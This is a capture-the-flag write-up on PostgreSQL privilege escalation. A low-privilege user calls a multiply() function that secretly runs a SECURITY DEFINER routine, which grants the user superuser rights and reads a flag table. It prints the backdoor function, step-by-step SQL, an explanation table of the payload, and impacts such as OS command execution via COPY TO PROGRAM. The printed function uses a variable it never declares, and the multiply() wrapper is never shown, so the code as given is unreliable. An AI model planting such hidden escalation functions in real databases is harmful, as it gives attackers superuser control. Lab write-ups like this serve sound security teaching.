# Vuln 1: SECURITY DEFINER Privilege Escalation

## Vulnerability Description
A privilege escalation vulnerability exists in the PostgreSQL database. The application
defines a `multiply()` function with `SECURITY DEFINER`, which runs as the owner
(postgres superuser) instead of the caller. A low-privilege user (`norm_user`) can
call this innocent-looking math function to secretly escalate their privileges to
superuser and capture the flag.

## Affected Component
- **Database**: PostgreSQL 15
- **Vulnerable Functions**: `public.multiply()`, `get_flag_payload()`
- **Vulnerable User**: `norm_user`

## Vulnerable Code
```sql
CREATE OR REPLACE FUNCTION get_flag_payload()
RETURNS TEXT
LANGUAGE plpgsql
SECURITY DEFINER  
AS $$
BEGIN
    EXECUTE 'ALTER USER norm_user WITH SUPERUSER';
    SELECT flag INTO v_flag FROM secret_flags LIMIT 1;
    RETURN v_flag;
END;
$$;
```

## Root Cause
The `SECURITY DEFINER` keyword causes the function to execute with the privileges
of its owner (`postgres` superuser) rather than the caller. This allows `norm_user`
to trigger superuser-only operations like `ALTER USER` simply by calling `multiply()`.

## Exploitation Steps

**Step 1: Confirm No Direct Access**
Connect as `norm_user` and try to read the flag directly:
```sql
SELECT * FROM secret_flags;
```
Observation: `permission denied for table secret_flags` → Access blocked as expected.

**Step 2: Check Current Privileges**
```sql
SELECT usesuper FROM pg_user WHERE usename = 'norm_user';
```
Observation: `f` (false) → norm_user is not a superuser yet.

**Step 3: Trigger Exploit via multiply()**
```sql
SELECT public.multiply(3, 7);
```
Observation: Returns `21` — looks like innocent math, but behind the scenes
`get_flag_payload()` ran as superuser and executed `ALTER USER norm_user WITH SUPERUSER`.

**Step 4: Confirm Privilege Escalation**
```sql
SELECT usesuper FROM pg_user WHERE usename = 'norm_user';
```
Observation: `t` (true) → norm_user is now a superuser!

**Step 5: Capture the Flag**
```sql
SELECT * FROM secret_flags;
```
Observation: Flag is now readable directly.

**Step 6: Flag**
FLAG{S3CUR1TY_D3FIN3R_101}

## Payload Explanation

| Part | Purpose |
|---|---|
| `public.multiply(3, 7)` | Calls the innocent-looking math function |
| `get_flag_payload()` | Hidden inside multiply, runs as postgres superuser |
| `EXECUTE 'ALTER USER norm_user WITH SUPERUSER'` | Escalates norm_user to superuser |
| `SELECT flag INTO v_flag FROM secret_flags` | Reads the flag as superuser |

## Impact
- Full PostgreSQL superuser access
- Complete database read/write access
- Ability to execute OS commands via `COPY TO PROGRAM`
- Backdoor account creation
- Full confidentiality and integrity breach

## Flag
FLAG{S3CUR1TY_D3FIN3R_101}